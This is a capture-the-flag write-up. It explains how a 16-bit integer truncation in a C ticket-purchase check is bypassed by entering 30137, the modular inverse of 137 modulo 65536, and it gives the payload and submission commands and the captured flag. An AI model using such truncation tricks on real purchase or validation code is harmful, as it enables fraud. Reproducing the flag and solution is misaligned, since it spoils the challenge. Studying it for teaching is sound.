## Challenge Summary
The service asks for a ticket quantity.  
Ticket price is `137`, budget is `200`.  
To get the flag you must buy **at least 900 tickets** while keeping the computed total `<= 200`.

At first glance this is impossible: `900 * 137 = 123,300`, way over `200`.  
The trick is that the total is stored in a **16-bit unsigned integer**, so the multiplication wraps around modulo `65536`.

---

## Source Code Analysis
```c
unsigned quantity = 0;
if (scanf("%u", &quantity) != 1 || quantity > 65535) return 0;

uint16_t total = (uint16_t)(quantity * 137);
if (total <= 200 && quantity >= 900) reward();
else puts("Purchase refused.");
```

Key points:
- `quantity` is a 32-bit `unsigned int`.
- It must be `<= 65535`.
- It must be `>= 900`.
- `total` is `uint16_t`, so the result of `quantity * 137` is truncated to 16 bits.

We need:
```
quantity >= 900
quantity <= 65535
(quantity * 137) mod 65536 <= 200
```

The easiest target is to make `total = 1`.  
So we need:
```
quantity * 137 ≡ 1 (mod 65536)
```

This is a modular inverse problem.  
Find `quantity` such that `137 * quantity ≡ 1 mod 65536`.

Using the extended Euclidean algorithm (or a quick script):
```
quantity = 30137
```

Check:
```
30137 * 137 = 4,128,769
4,128,769 mod 65536 = 1
```
because `65536 * 63 = 4,128,768`.

So:
- `quantity = 30137` → passes `quantity >= 900` and `quantity <= 65535`
- `total = 1` → passes `total <= 200`

The condition succeeds and `reward()` is called.

---

## Exploit Steps

### 1. Create the payload
The program reads an unsigned integer from `stdin`.  
The remote service receives the raw POST body as `stdin`, so the payload is simply the decimal number followed by a newline.

```bash
cd ~/narrow
printf '30137\n' > payload.bin
```

### 2. Test locally
```bash
chmod +x service
echo "TESTFLAG{dummy}" > /tmp/testflag
FLAG_PATH=/tmp/testflag ./service < payload.bin
```

Expected output:
```
Ticket price: 137. Budget: 200. Quantity?
TESTFLAG{dummy}
```

### 3. Send to remote
Use the supplied client:
```bash
python3 client.py https://challenges.tibeb.org/76052c38-52f4-4ae6-883e-bb9ee5140fe3 < payload.bin
```

If IPv6 causes trouble, add `--ipv4`:
```bash
python3 client.py --ipv4 https://challenges.tibeb.org/76052c38-52f4-4ae6-883e-bb9ee5140fe3 < payload.bin
```

### 4. Result
The server responds with the flag:
```
tibeb{narrow_counter_6334556160b538ab31b6}
```

---

## Tricky Parts to Note
- **Integer truncation:** The vulnerability is not a buffer overflow. NX, no PIE, and no stack canary are irrelevant. The bug is purely arithmetic.
- **16-bit wrap:** `uint16_t total = (uint16_t)(quantity * 137);` truncates the 32-bit product to 16 bits.
- **Modular inverse:** The solution is the modular inverse of `137` modulo `65536`. Since `137` is odd and coprime to `65536`, an inverse exists.
- **Quantity bounds:** You must also satisfy `900 <= quantity <= 65535`. The inverse `30137` naturally falls in that range.
- **Input format:** The service reads with `scanf("%u")`, so a plain decimal number is enough. The client sends the file as the POST body, which becomes `stdin` for the service.

---

## Flag
```
tibeb{narrow_counter_6334556160b538ab31b6}
```
